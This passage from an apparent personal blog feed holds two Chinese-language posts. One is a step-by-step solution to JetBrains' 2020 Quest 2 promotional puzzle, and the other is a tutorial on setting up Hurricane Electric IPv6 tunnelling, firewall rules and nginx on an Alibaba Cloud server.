rel="noopener">他的官网</a>。</p></blockquote><p>上去看了一下，感觉就是可以动态修改前端的代码，不用直接修改原本的网站文件，不需要重新部署。而且还自带版本管理，可以多人合作之类的吧。</p><p>谷歌的统计也是用这个来实现的。</p><p>不过有个缺点是，国内访问比较慢而且说不定哪天就连接不上了。</p><p>emmm 后面有空感兴趣再折腾吧（</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/googletagmanager.png" alt="googletagmanager"></p><br><hr><br><h2 id="Quest-2"><a href="#Quest-2" class="headerlink" title="Quest 2"></a>Quest 2</h2><p>来了来了！第二个 Quest 来了！</p><p><a href="https://twitter.com/jetbrains/status/1237694815283879943" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1237694815283879943</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest2.png" alt="Quest2"></p><pre><code>.spleh A+lrtC/dmC .thgis fo tuo si ti semitemos ,etihw si txet nehw sa drah kooL .tseretni wohs dluohs uoy ecalp a si ,dessecorp si xat hctuD erehw esac ehT .sedih tseuq fo txen eht erehw si ,deificeps era segaugnal cificeps-niamod tcudorp ehT</code></pre><p>很明显倒叙了，这里反过来得到：</p><pre><code>The product domain-specific languages are specified, is where the next of quest hides. The case where Dutch tax is processed, is a place you should show interest. Look hard as when text is white, sometimes it is out of sight. Cmd/Ctrl+A helps.</code></pre><p>提示了是个与 <code>domain-specific languages</code>有关的产品，quest相关的文字设置为白色的了。</p><br><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>谷歌搜一下，直接就得到了 JetBrains 家的 <strong>MPS</strong> (MetaProgrammingSystem)   <em>（之前也没了解过</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-1.png" alt="谷歌搜索结果"></p><p>访问它的官网吧，传送喵：<a href="https://www.jetbrains.com/mps/" target="_blank" rel="noopener">https://www.jetbrains.com/mps/</a></p><br><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>在网页里同样搜一下 <code>quest</code></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-2.png" alt="网页里找到pdf"></p><p>发现有个 PDF 文件唉~</p><p>打开来看看吧！</p><br><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>于是继续在 PDF 里搜索<code>quest</code>。</p><p>发现果然是白色的文字23333.</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-3.png" alt="Step3"></p><p>Ctrl + A ，Ctrl + C / V，看一下那一块的文字</p><pre><code>This is our 20th year as a company,we have shared numbers in our JetBrainsAnnual report, sharing the section with18,650 numbers will progress your quest</code></pre><br><h3 id="Step-4-1"><a href="#Step-4-1" class="headerlink" title="Step 4"></a>Step 4</h3><p>上面提示了JB 20周年年度报告，想起来官网首页上有个链接来着。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years.png" alt="20周年"></p><p><a href="https://www.jetbrains.com/company/annualreport/2019/" target="_blank" rel="noopener">https://www.jetbrains.com/company/annualreport/2019/</a></p><p>插几句题外话。</p><p>就是个年报吧，看上去 JB 的确挺受欢迎哒！（PyCharm 真挺好用的</p><p>下面这个视频封面的小黄鸭让我想到了 <strong>小黄鸭调试法</strong> 23333</p><p>（这个 <code>Dogfooding</code> 用的有点意思</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years2.png" alt=""></p><p>这回再来搜索 <code>quest</code>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-4.png" alt="Step4"></p><p>第七届 Hackathon。（emmm</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>react-js-quick-share<span class="token punctuation">"</span></span> <span class="token attr-name">data-hashtag</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>JetBrainsQuest<span class="token punctuation">"</span></span> <span class="token attr-name">data-text</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>I have found the JetBrains Quest! Sometimes you just need to look closely at the Haskell language, Hello,World! in the hackathon lego brainstorms project https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/<span class="token punctuation">"</span></span> <span class="token attr-name">data-theme</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dark<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><br><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>访问 <a href="https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/" target="_blank" rel="noopener">https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/</a></p><p>重点关注 <code>Haskell language</code>，<code>Hello,World!</code>，<code>hackathon lego brainstorms project</code>。</p><p>看来就与这张图有关了呢！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-5.png" alt="Step5"></p><p>看来就是右边图上这段话了。emmm</p><pre><code>d1D joo KN0w J378r41n2 12 4lw4y2 H1R1Ng? ch3ck Ou7 t3h K4r33r2 P4g3 4nD 533 1f 7H3r3 12 4 J08 0R 4 KW35T 0 cH4Ll3n93 70 g0 fUr7h3r @ 13457.</code></pre><p>草（一种植物），我大概翻译出来了！</p><pre><code>Did you know jetbrains is always hiring?Check Out the kareersPage and see if here is a job or akwest challenge togo further at least</code></pre><p>形象带师 233333</p><p>（讲真，觉得 CTF 有趣的一个原因大概就是从各种奇怪的数字大小写字母混杂的形象的 flag 开始的吧</p><p>（觉得出题人脑洞就很大</p><p>比如随手来一个 → <code>flag{1t_I5_s0_Fun_70_S33_y0u_H3r3}</code>。😁</p><p>不过这里第一次见把<code>2</code>当作<code>s</code>的。</p><p>还有<code>kareers</code>应该是<code>careers</code>，<code>kwest</code>应该是<code>quest</code>吧 23333.</p><blockquote><p>查了一下，发现原来这个叫做 <strong>Leet</strong>，又叫 <strong>黑客语</strong>。</p><p>详见 <code>VV 1 |&lt; 1 P 3 [) 1 4</code> ，<a href="https://zh.wikipedia.org/zh-cn/Leet" target="_blank" rel="noopener">click here</a>.</p></blockquote><p>所以 JB 顺便再来招个聘？</p><p>看来下一个 Step 是个与 job 有关的地方了。</p><br><h3 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h3><p>在官网上找到了 Company -&gt; Careers -&gt; Jobs.</p><p><a href="https://www.jetbrains.com/careers/jobs/" target="_blank" rel="noopener">https://www.jetbrains.com/careers/jobs/</a></p><p>搜索<code>Quest</code>，发现了一个奇怪的职位。那就是它了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-6.png" alt="Step6"></p><p>于是来到了<a href="https://www.jetbrains.com/careers/jobs/fearless-quester-356/" target="_blank" rel="noopener">这个页面</a> ↓。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester.png" alt="fearless_quester"></p><p>233333 这里回顾了一下这一路 journey 经历过的那些有意思的东西。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester2.png" alt="fearless_quester2"></p><p>到下面这里，点击按钮，会给它的邮箱发个邮件。</p><p>（<code>mailto:jobs@jetbrains.com?subject=Fearless Quester - Any - any</code></p><p>然而发现并不是啦 23333.</p><p>然后再看回 <code>To progress with your quest what you’ll need</code>。</p><p>应该是与一个游戏开发有关，查了一下 Konami games.</p><blockquote><p>日本最具影响力的游戏软件商之一，<em>KONAMI</em>（科乐美）。</p></blockquote><p>可能是有个游戏啥的？</p><br><h3 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h3><p>找了找 game develop，发现了一个<a href="https://www.jetbrains.com/gamedev/" target="_blank" rel="noopener">这个网页</a>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_development.png" alt="game_development"></p><p>然后找死找不到<code>quest</code>，难受死了。</p><p>在 Network 里找个半天也没找到嘤嘤嘤。</p><p>就在一脸懵逼的时候，想起来好像没有用 Chrome 的无痕模式（（</p><blockquote><p>后来发现是我的浏览器开了弹窗拦截，把找个也给误拦截了emmm。</p></blockquote><p>再一搜，发现了相关的 js 文件。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-7.png" alt="Step7"></p><br><h3 id="Beat-The-Quest-1"><a href="#Beat-The-Quest-1" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>在<code>block-breaker.js</code> 这个文件里搜索<code>quest</code>，发现了第二个 quest 的 code ↓。</p><p><em>（可能这个也是非预期解了23333</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/block-breakerJS.png" alt="block-breaker_JS"></p><pre><code>"\n        |\n        |\n        |   Congratulations you have beat the second quest.\n        |   Use the code key GamesAreFun on the\n        |   quest page https://jb.gg/quest to claim your prize.\n        |     \n    "</code></pre><p>所以 Code 就是 <code>GamesAreFun</code> 啦~</p><p>拿着它去 <a href="https://jb.gg/quest" target="_blank" rel="noopener">https://jb.gg/quest</a> 换新的授权吧嘻嘻嘻。</p><p>发现也是跳转到之前的那个页面（ <a href="https://www.jetbrains.com/promo/quest/" target="_blank" rel="noopener">https://www.jetbrains.com/promo/quest/</a> ）。</p><p>同样输入邮箱和 Code 就好了。</p><p>又得到3个月的免费授权！上面说了可以叠加使用。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Beat_quest2.png" alt="Beat_quest2"></p><blockquote><p>You have passed the second quest and have proven yourself a worthy contender for our devious puzzles. We have one last quest in this series for you. It will be the ultimate quest, and it will secure your place in the halls of JetBrains Quest legend.</p><p><strong>A little @jetbrains bird will deliver the next clue – so do some birdwatching,</strong></p></blockquote><p>噫！还有<strong>一个终极的 quest</strong> 等着大家呢！</p><p>猜一猜是不是六个月的授权，然后凑成一整年呢哈哈哈哈哈。</p><hr><p>然后在邮件结尾又发现了 Leet，就是 Step5 中提到的那个黑客语。这才发现原来 Quest1 的邮件中也有。</p><p>可能这也算是一个暗示/hint 吧！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/email_leet.png" alt="email_leet"></p><pre><code>Y0U H4V3 R3C13V3D 7H15 3M41L B3C4U53 Y0U H4V3 P4RT1C1P4T3D 1N J3TBR41N5 QU35T</code></pre><p>这里还可以取消邮件订阅啥的，应该还算挺友好的吧。</p><br><br><h3 id="Step7-中-game-dev-页面的游戏解法"><a href="#Step7-中-game-dev-页面的游戏解法" class="headerlink" title="Step7 中 game dev 页面的游戏解法"></a>Step7 中 game dev 页面的游戏解法</h3><p>再回去看一下这个游戏到底啥回事。结合再上一步中的提示。</p><blockquote><p><strong>To progress with your quest what you’ll need:</strong></p><ul><li>To check out what we have for game developers.</li><li>Be geeky enough to remember how you used to cheat at Konami games.</li><li>Try cheating on the page.</li></ul></blockquote><p>看了一下别人的讨论，才大概明白这个的意思。</p><p>他是想让你用在 Konami games 里积累的技巧来唤出游戏界面，然后尝试完成游戏，或者尝试在网页中作弊完成（可能是上面的非预期解吧）。</p><p>根据别人的说法，<strong>在网页里</strong>通过依次按下键盘上的 <code>上上下下左右左右BA</code> 这几个键，就能唤出游戏界面了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_start.png" alt="游戏开始界面"></p><p>原来就是个弹球游戏啊 23333. 而且球掉了还可以继续玩。</p><p>看了一下是通过一个 canvas 来实现的。</p><p>把条块消除得差不多就看到 code key 啦！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game.png" alt="game"></p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉 JetBrains 的这两个 Quest 难度还好，还是挺友好的。</p><p>于是就白嫖了总共六个月的 JB 全家产品免费授权。</p><p>（不过之前就有教育邮箱的免费授权呢</p><p>所以通过这个 Quest，让我们更深入地了解了 JB？说不定还能顺便招聘？</p><p>（这大概是其本意吧？（盲猜</p><p>注意一下上面的内容<strong>仅供学习研究</strong>，转载的话记得留下本文链接呢。</p><p>欢迎一起交流嘻嘻嘻。</p><p>（溜了溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用TunnelBroker给阿里云ECS配置公网IPv6</title>
      <link href="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/"/>
      <url>/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>目前 IPv6 用得挺广了吧，很多应用都支持 IPv6 了，三大运营商基本都支持了，联通的流量自带 IPv6，而且开热点的话还支持下发给其他设备。</p><p>不过其实很多服务器都没上 IPv6，比如阿里云的 ECS 一般公网只有 IPv4 地址（想拥有一个 IPv6 地址还得再花钱）。</p><p>于是最近就折腾了一下，利用 Hurricane Electric 提供的<strong>免费 IPv6 Tunnel Broker</strong>，让阿里云的 ECS 拥有了 IPv6 地址（非原生），理论上大部分服务器都适用的。</p><p>这里用到的是 IPv6 Tunnel，基于 <strong>protocol-41 (6in4)</strong>，其实是把 IPv6 包通过 IPv4 包来传输，相当于建立在网络层上的代理，需要你的服务器的操作系统支持，而且要有一个<strong>相对固定的公网 IPv4 地址</strong>。</p><blockquote><p>When using 6to4, you do not transmit IPv6 packets. Instead, special IPv4 packets are wrapped around IPv6 payloads. These packets have IPv4  protocol 41, as defined by RFC 2473.</p></blockquote><p>当然，性能的话肯定比不上原生的 IPv6 了，不过自己玩玩还好，问题不大吧。</p><hr><h2 id="0x01-申请-IPv6-Tunnel-Broker"><a href="#0x01-申请-IPv6-Tunnel-Broker" class="headerlink" title="0x01 申请 IPv6 Tunnel Broker"></a>0x01 申请 IPv6 Tunnel Broker</h2><p>前往 <a href="https://tunnelbroker.net" target="_blank" rel="noopener">https://tunnelbroker.net</a>，注册一个你自己的账号。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/register.png" alt="注册账号"></p><p>登录之后，点击左侧的 <a href="https://www.tunnelbroker.net/new_tunnel.php" target="_blank" rel="noopener">Create Regular Tunnel</a>。</p><p>一个账号最多可以创建5条tunnel。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/create_tunnel.png" alt="创建隧道"></p><p>IPv4 Endpoint 里填<strong>服务器的公网地址</strong>，输入后会自动检查是否支持。</p><p>You are viewing from 显示的是你访问网站的公网 IPv4 地址，如果是在服务器上访问的话 Endpoint 就是这个了。</p><p><strong>注意：</strong>服务器要<strong>允许来自 HE 的 ICMP 请求</strong>，也就是说不能禁止来自 HE 的 ping。</p><p>（这里借一张网上的图，比如下面这样的↓</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ICMP_blocked.png" alt="icmp_block"></p><p>Available Tunnel Servers 里选择离你服务器较近的，可以在服务器上ping试一试。</p><p>现在显示 <code>Los Angeles, CA, US Not Available (Full)</code>，洛杉矶的都满了233.</p><p>Asia 有 HK、SG、JP 这三个节点，不过据网上说貌似速度也不怎么样了，具体自己看看吧。</p><p>选择好之后就点击<strong>创建隧道</strong>就申请好了。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/tunnel_details.png" alt="tunnel_details"></p><p>这里的 Client IPv4 Address 是你之前填的地址，点击可以进行修改，</p><p><strong>Client IPv6 Address</strong> 就是你服务器的<strong>公网IPv6地址</strong>了，如果需要DNS解析的话就给这个地址加个 AAAA 解析就行（注意不需要加上<code>/64</code>）。</p><p>这里的 Routed IPv6 Prefixes 是该隧道可用于分配的 IPv6 地址段，可为内网机器都分配上唯一的 IPv6 地址。</p><p>可见分配的是 <code>/64</code>，即 IPv6 地址的前缀长度为64位。后（128-64=）64位为网络接口ID（可理解为设备在网络上的唯一ID），因此你有2^64（1844亿亿）个可用的IP地址了。😉</p><p>当然你还可以申请一个<code>/48</code>前缀的路由，这样可用的地址更多了。（2^80个）</p><hr><h2 id="0x02-阿里云-ECS-开启-IPv6"><a href="#0x02-阿里云-ECS-开启-IPv6" class="headerlink" title="0x02 阿里云 ECS 开启 IPv6"></a>0x02 阿里云 ECS 开启 IPv6</h2><p>阿里云的硬盘镜像默认是把 IPv6 给关掉的，这里就手动打开好了。</p><pre class=" language-bash"><code class="language-bash">vim /etc/sysctl.conf</code></pre><p>在文件末尾的位置把ipv6设置中的1改成0，变成类似如下的亚子。</p><pre><code>net.ipv6.conf.all.disable_ipv6 = 0net.ipv6.conf.default.disable_ipv6 = 0net.ipv6.conf.lo.disable_ipv6 = 0net.ipv6.conf.eth0.disable_ipv6 = 0</code></pre><p>而后重新载入配置。</p><pre class=" language-bash"><code class="language-bash">sysctl -p</code></pre><p>然后使用<code>ifconfig</code>看一看，就会发现支持 IPv6 了。</p><p>比如下面这个，有了<code>inet6</code>这一项。</p><pre><code>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.xxx.xxx.xxx  netmask 255.255.240.0  broadcast 172.xxx.xxx.xxx        inet6 fe80::xxxx:xxxx:xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:xx:xx:xx:xx  txqueuelen 1000  (以太网)        RX packets 1688753  bytes 328028654 (328.0 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1837158  bytes 637871915 (637.8 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><hr><h2 id="0x03-给-ECS-配置-IPv6-隧道"><a href="#0x03-给-ECS-配置-IPv6-隧道" class="headerlink" title="0x03 给 ECS 配置 IPv6 隧道"></a>0x03 给 ECS 配置 IPv6 隧道</h2><p>在Example Configuration 里有很多示例。</p><p>比如Ubuntu的。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration.png" alt="interface_configuration"></p><pre class=" language-bash"><code class="language-bash">vim /etc/network/interfaces</code></pre><pre><code>auto he-ipv6iface he-ipv6 inet6 v4tunnel        address 2001:470:xxxx:xxxx::2        netmask 64        endpoint 216.218.xxx.xxx        local 172.16.xxx.xxx        ttl 255        gateway 2001:470:xxxx:xxxx::1</code></pre><p>将上面的配置粘贴到文件的最后。</p><p>注意一下，<strong>内网环境要用内网的IP！</strong>他这里也写清楚了的。</p><blockquote><p><strong>NOTE:</strong> When behind a firewall appliance that passes protocol 41,  use the IPv4 address you get from your appliance’s DHCP service instead  of the IPv4 endpoint you provided to our broker.</p></blockquote><p><strong>注意：</strong> 阿里云的 ECS 要<strong>将local中的IP修改为内网的IP</strong>，即私网IP地址，例如<code>172.16.xxx.xxx</code>，而不是公网IP！！！</p><p>不清楚的话还可以参考<strong>Ubuntu的Wiki</strong>，<a href="https://wiki.ubuntu.com/IPv6#Get_connected_with_Hurricane_Electric" target="_blank" rel="noopener">戳这里</a>。</p><p>而后<strong>让IPv6生效</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifup</span> he-ipv6</code></pre><p>再看一下 <code>ifconfig</code>，这时应该有一个 <code>he-ipv6</code>的了！类似这样的。</p><pre><code>he-ipv6: flags=209&lt;UP,POINTOPOINT,RUNNING,NOARP&gt;  mtu 1480          inet6 2001:470:xxxx:xxxx::2  prefixlen 64  scopeid 0x0&lt;global&gt;          inet6 fe80::xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;          sit  txqueuelen 1000  (IPv6-in-IPv4)          RX packets 11605  bytes 3127821 (3.1 MB)          RX errors 0  dropped 0  overruns 0  frame 0          TX packets 13811  bytes 2403522 (2.4 MB)          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p><em>P.S.:</em></p><p>如果想<strong>让隧道失效</strong>（没有删除的话重启后还是会自动启用）：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifdown</span> he-ipv6</code></pre><p>如果想<strong>删除隧道</strong>：</p><pre class=" language-bash"><code class="language-bash">ip tunnel del he-ipv6</code></pre><p>如果已经生效了会提示：<code>ifup: interface he-ipv6 already configured</code>。</p><p>如果设置出错了，或者想修改配置，需要先删除隧道，再重新生效就好。</p><p>现在就来<strong>测试一下</strong>吧！</p><pre class=" language-bash"><code class="language-bash">root@miaoTony:~<span class="token comment" spellcheck="true"># ping6 -c 5 ipv6.google.com</span>PING ipv6.google.com<span class="token punctuation">(</span>tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">))</span> 56 data bytes64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>1 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>393 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>2 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>390 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>3 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>390 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>4 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>393 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>5 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>388 ms--- ipv6.google.com <span class="token function">ping</span> statistics ---5 packets transmitted, 5 received, 0% packet loss, <span class="token function">time</span> 4003msrtt min/avg/max/mdev <span class="token operator">=</span> 388.107/391.132/393.213/1.914 ms</code></pre><p>当然也可以 <code>ping6 ipv6.baidu.com</code>。</p><p>如果不成功可以重启系统试试。</p><hr><p>当然，你也可以尝试在命令行中进行配置（略）。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration2.png" alt="interface_configuration2"></p><p>Windows 10 下的配置，在 cmd 中执行下面的命令。</p><pre><code>netsh interface teredo set state disablednetsh interface ipv6 add v6v4tunnel interface=IP6Tunnel localaddress=172.16.xxx.xxx remoteaddress=216.218.xxx.xxxnetsh interface ipv6 add address interface=IP6Tunnel address=2001:470:xx:xxxx::2netsh interface ipv6 add route prefix=::/0 interface=IP6Tunnel nexthop=2001:470:xx:xxxx::1</code></pre><p>注意修改对应的IP地址。</p><hr><h2 id="0x04-一些问题的解决"><a href="#0x04-一些问题的解决" class="headerlink" title="0x04 一些问题的解决"></a>0x04 一些问题的解决</h2><p><strong>按照上面一番配置好</strong>之后，有可能还是访问不了 IPv6 的网站。</p><p><strong>有可能</strong>需要如下处理吧。<em>（谁知道会这么麻烦呢</em></p><p>要是没事了就直接往下看了。</p><ul><li>需要放行服务器的41端口。毕竟流量是通过IPv4传输的啦。</li></ul><p>例如：</p><pre class=" language-bash"><code class="language-bash">ufw allow 41</code></pre><p>或者</p><pre class=" language-bash"><code class="language-bash">iptables -t filter -I INPUT -p 41 -j ACCEPTiptables -t filter -I OUTPUT -p 41 -j ACCEPT</code></pre><p>同时要记得在（阿里云的）<strong>安全组里放行</strong>。</p><ul><li>配置好 IPv6 的 DNS</li></ul><pre class=" language-bash"><code class="language-bash">vim /etc/resolv.conf</code></pre><p>在最后添加谷歌的DNS服务器 </p><pre class=" language-bash"><code class="language-bash">nameserver 2001:4860:4860::8888nameserver 2001:4860:4860::8844</code></pre><p>或者国内的公共DNS：<code>240c::6666</code> 或 <code>240c::6644</code></p><ul><li>添加路由</li></ul><pre class=" language-bash"><code class="language-bash">route -A inet6 add ::/0 dev he-ipv6</code></pre><p>再 ping 一下应该可以了吧（</p><p>不行再重启试试（重启解决绝大部分问题呢</p><hr><h2 id="0x05-Nginx-支持-IPv6-访问"><a href="#0x05-Nginx-支持-IPv6-访问" class="headerlink" title="0x05 Nginx 支持 IPv6 访问"></a>0x05 Nginx 支持 IPv6 访问</h2><p>修改配置文件，监听 IPv6 端口。</p><pre><code>server {  listen 80;  listen [::]:80; // 监听 IPv6 的 80 端口  # ...}server {  listen 443 ssl http2;   listen [::]:443 ssl http2; // 监听 IPv6 的 443 端口  # ...}</code></pre><p>然而，发现一个情况，只有当服务器访问IPv6的网站的时候，或者说有 IPv6 流量的时候，外网才能通过这个公网的IPv6地址访问到服务器emmm。（懵 </p><p>于是加一个 cron 计划，定时ping一下好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">crontab</span> -e</code></pre><p>添加一个计划。</p><pre><code>*/1 * * * * ping6 -c 1 he.net</code></pre><p>重启 cron 使其生效。</p><pre class=" language-bash"><code class="language-bash">systemctl restart <span class="token function">cron</span></code></pre><p>每分钟执行一次 ping 操作，这样访问就没问题了。</p><p><em>（不过想不大明白为啥这个通道会自动断开。有人说与 ip6tables 有关，不大清楚。。 emmm</em></p><hr><h2 id="0x06-配置-DNS"><a href="#0x06-配置-DNS" class="headerlink" title="0x06 配置 DNS"></a>0x06 配置 DNS</h2><p>配置一条<strong>AAAA记录指向公网的 IPv6 地址</strong>即可。可以试试开启CDN。</p><p>而后就可以通过域名访问网站了。</p><p>不过没有 CDN 的话只能通过 IPv6 进行访问。</p><hr><h2 id="0x07-检查网站是否支持-IPv6"><a href="#0x07-检查网站是否支持-IPv6" class="headerlink" title="0x07 检查网站是否支持 IPv6"></a>0x07 检查网站是否支持 IPv6</h2><p>利用 <a href="http://ipv6-test.com/validate.php" target="_blank" rel="noopener">http://ipv6-test.com/validate.php</a></p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ipv6test.png" alt="ipv6test"></p><hr><h2 id="0x08-自动更新-Endpoint-IP"><a href="#0x08-自动更新-Endpoint-IP" class="headerlink" title="0x08 自动更新 Endpoint IP"></a>0x08 自动更新 Endpoint IP</h2><p>前面说只要公网的IPv4地址<strong>相对固定</strong>就好了，这里就这个意思啦。</p><p>HE 还支持<strong>为动态 IPv4 地址建立 IPv6 通道</strong>，这里要用到他提供的API了。</p><blockquote><p>We’ve added support for Dyn-compliant endpoint updates so that equipment talking this spec can very easily update your tunnel endpoint.</p><p><strong>Update URL:</strong> <a href="https://ipv4.tunnelbroker.net/nic/update" target="_blank" rel="noopener">https://ipv4.tunnelbroker.net/nic/update</a>  (<em>ipv4 is important here, don’t remove it</em>)<br><strong>Username:</strong> Your Tunnelbroker.net username<br><strong>Password:</strong> Tunnel specific authentication key (under Advanced on the tunnel  information page) if one is set, otherwise your Tunnelbroker.net  password.<br><strong>Hostname:</strong></p><ul><li>Numeric tunnel ID</li><li>Numeric tunnel ID in “tunnel#.tunnelbroker.net” (<em>This host does not actually exist</em>)</li><li>Tunnel reverse host, aka “user-#.tunnel.tserv#.loc#.ipv6.he.net”</li></ul></blockquote><p>或者也可以访问更新的URL。</p><p>就可以在服务器上写个脚本检查公网地址有没有更新就好了。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/Dynamic_Update.png" alt="动态更新"></p><p><strong>自动更新IPv4地址：</strong></p><p>To auto-detect your IPv4 address:</p><pre><code>https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;</code></pre><p><strong>手动指定更新的IPv4地址：</strong></p><p>To manually specific your IPv4 address:</p><pre><code>https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;</code></pre><p><strong>当然不想看的话就看完整版：</strong></p><p><strong>TL;DR:</strong>（<code>Too long; Don't read</code>/ <code>Too long; Didn't read</code>）</p><pre><code>http[s]://[TB_USER:TB_PASS@]tunnelbroker.net/nic/update?[username=TB_USER&amp;password=TB_PASS&amp;]hostname=&lt;TUNNEL_ID|tunnelTUNNEL_ID.tunnelbroker.net|TB_USER-TUNNEL_LABEL.tserv#.LOC#.ipv6.he.net&gt;[&amp;myip=IPV4]</code></pre><p>后面可以试一试这个功能 hhhh</p><p>当然了，HE还自带了 DNS 解析，可以尝试一下呢。</p><p>下面还有一些关于 IPv6 的拓展的链接。</p><p>好了就这样吧。</p><p>（溜了溜了</p><h2 id="Reference-amp-Extensive-Reading"><a href="#Reference-amp-Extensive-Reading" class="headerlink" title="Reference &amp; Extensive Reading"></a>Reference &amp; Extensive Reading</h2><p><a href="https://blog.csdn.net/kaikai0803/article/details/94615666" target="_blank" rel="noopener">记一次给线上服务器添加IPv6支持的步骤</a></p><p><a href="https://wzfou.com/he-net-dns/" target="_blank" rel="noopener">He.net 